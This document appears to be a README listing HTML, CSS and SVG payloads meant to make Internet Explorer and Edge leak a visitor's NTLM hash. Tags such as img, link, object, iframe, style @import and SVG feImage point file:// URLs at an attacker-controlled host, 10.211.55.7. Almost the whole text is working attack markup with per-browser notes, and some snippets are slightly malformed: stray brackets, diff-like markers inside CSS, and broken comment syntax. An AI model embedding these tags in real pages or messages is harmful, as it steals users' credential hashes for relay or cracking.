# Leak-NTLM-hash-via-HTML
List of HTML tags for leak NTLM hash for Internet Explorer and Edge.

## Body tags

### Link 
```html
<link rel="stylesheet" href="file://10.211.55.7/link-stylesheet" /> <--only for Edge-->
```

### Body 
```html
<body background="file://10.211.55.7/body-background">
```

### Table 
```html
<table background="file://10.211.55.7/table-background">
```

### Img 
```html
<img src="file://10.211.55.7/img-src">
<img lowsrc="file://10.211.55.7/img-lowsrc"> <--only for IE-->
```

### Image
```html
<image src="file://10.211.55.7/image-src">
```]

### Form
```html
<input type="image" src="file://10.211.55.7/input-src" name="test" value="test">
<isindex src="file://10.211.55.7/isindex-src" type="image"> <--only for IE-->
```

### Multi
```html
<bgsound src="file://10.211.55.7/bgsound-src"></bgsound> <--only for IE-->
<video src="file://10.211.55.7/video-src"> <--only for Edge-->
<audio src="file://10.211.55.7/audio-src"></audio> <--only for Edge-->
<video poster="file://10.211.55.7/video-poster" src="file://10.211.55.7/video-poster-2"></video>
```

### Object
```html
<object classid="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"> 
  <param name="DataURL" value="file://10.211.55.7/object-param-dataurl">
</object>
<--only for IE-->
```

```html
<object classid="clsid:6BF52A52-394A-11d3-B153-00C04F79FAA6"> 
    <param name="URL" value="file://10.211.55.7/object-param-url">
</object>
<--only for IE, by click yes onload or play click play button-->
```

### Script
```html
<script src="file://10.211.55.7/script-src"></script>
```

### Frame
```html
<iframe src="view-source:file://10.211.55.7/iframe-src-viewsource"></iframe> <--only for Edge-->
<iframe src="javascript:'&lt;iframe src=&quot;javascript:\&apos;&lt;img src=file://10.211.55.7/iframe-javascript-src-2&gt;\&apos;&quot;&gt;&lt;/iframe&gt;'"></iframe> <--only for Edge-->
```

 ### Style
 ```html
 <b style="
       list-style-image: url&#40;file://10.211.55.7/inline-css-list-style-image&#41;;
       background-image: url&lpar;file://10.211.55.7/inline-css-background-image&rpar;;
       border-image-source: url(file://10.211.55.7/inline-css-border-image-source);
       cursor: url(file://10.211.55.7/inline-css-cursor), auto;
">MNO</b>

 <style>
    @import 'file://10.211.55.7/css-import-string';
    @import url(file://10.211.55.7/css-import-url);
</style>

<style>
   a::after {content: url(file://10.211.55.7/css-after-content-2)}
   a::before {content: url(file://10.211.55.7/css-before-content-2)}    
</style>
<a href="#">ABC</a>
<style>
    big {
       list-style-image: url(file://10.211.55.7/css-list-style-image);
       background-image: url(file://10.211.55.7/css-background-image);
       border-image-source: url(file://10.211.55.7/css-border-image-source);
       cursor: url(file://10.211.55.7/css-cursor), auto;
    }
</style>
<big>DEF</big>

<style>
    p#p1 {
        background-image: \75 \72 \6C (file://10.211.55.7/css-escape-url-1);
    }
    p#p2 {
        background-image: \000075\000072\00006C(file://10.211.55.7/css-escape-url-2);
    }
</style>
<p id="p1">bla</p>
<p id="p2">bla</p>
```
### SVG 
```html
<svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    <feImage xlink:href="file://10.211.55.7/svg-feimage" />
</svg>

<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
    <rect cursor="url(file://10.211.55.7/svg-cursor),auto" />
</svg>
```
```html
<svg> 
    <style>
        circle {
     edge +      fill: url(file://10.211.55.7/svg-css-fill#foo);
     edge +      mask: url(file://10.211.55.7/svg-css-mask#foo);
     -       -webkit-mask: url(file://10.211.55.7/svg-css--webkit-mask#foo);
     edge + filter: url(file://10.211.55.7/svg-css-filter#foo);
     edge + clip-path: url(file://10.211.55.7/svg-css-clip-path#foo);
        }
    </style>
    <circle r="40"></circle>
</svg> 
<--only for Edge-->
```
  
  
  
